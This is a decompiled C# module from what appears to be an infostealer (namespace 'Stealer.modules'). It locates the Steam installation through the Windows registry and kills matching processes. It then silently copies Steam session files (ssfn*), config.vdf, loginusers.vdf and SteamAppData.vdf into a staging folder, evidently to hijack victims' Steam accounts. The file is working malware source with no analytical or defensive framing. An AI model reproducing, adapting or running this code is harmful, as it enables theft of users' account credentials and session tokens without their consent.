using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace Stealer.modules
{
	// Token: 0x02000034 RID: 52
	internal class Steam
	{
		// Token: 0x0600010B RID: 267 RVA: 0x0000CA3C File Offset: 0x0000AC3C
		public static void CopySteam()
		{
			string name = "Name";
			string locationSteam = Steam.GetLocationSteam();
			string text = Program.path + "\\Steam";
			if (!Directory.Exists(locationSteam))
			{
				return;
			}
			Directory.CreateDirectory(text);
			Steam.Closing(name);
			try
			{
				foreach (string text2 in Directory.GetFiles(locationSteam, "ssfn*"))
				{
					string fileName = Path.GetFileName(text2);
					File.Copy(text2, Path.Combine(text, fileName), true);
				}
				if (File.Exists(locationSteam + "\\config\\config.vdf"))
				{
					File.Copy(locationSteam + "\\config\\config.vdf", text + "\\config.vdf");
				}
				if (File.Exists(locationSteam + "\\config\\loginusers.vdf"))
				{
					File.Copy(locationSteam + "\\config\\loginusers.vdf", text + "\\loginusers.vdf");
				}
				if (File.Exists(locationSteam + "\\config\\SteamAppData.vdf"))
				{
					File.Copy(locationSteam + "\\config\\SteamAppData.vdf", text + "\\SteamAppData.vdf");
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600010C RID: 268 RVA: 0x0000CB58 File Offset: 0x0000AD58
		private static string GetLocationSteam()
		{
			string result = string.Empty;
			if (Environment.Is64BitOperatingSystem)
			{
				try
				{
					return Registry.LocalMachine.OpenSubKey("Software\\Wow6432Node\\Valve\\Steam").GetValue("InstallPath").ToString();
				}
				catch
				{
					return result;
				}
			}
			try
			{
				result = Registry.LocalMachine.OpenSubKey("Software\\Valve\\Steam").GetValue("InstallPath").ToString();
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x0600010D RID: 269 RVA: 0x0000CBD8 File Offset: 0x0000ADD8
		public static void Closing(string name)
		{
			try
			{
				foreach (Process process in Process.GetProcesses())
				{
					if (process.ProcessName.Contains(name))
					{
						try
						{
							process.CloseMainWindow();
							if (!process.HasExited)
							{
								try
								{
									process.Kill();
								}
								catch
								{
								}
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
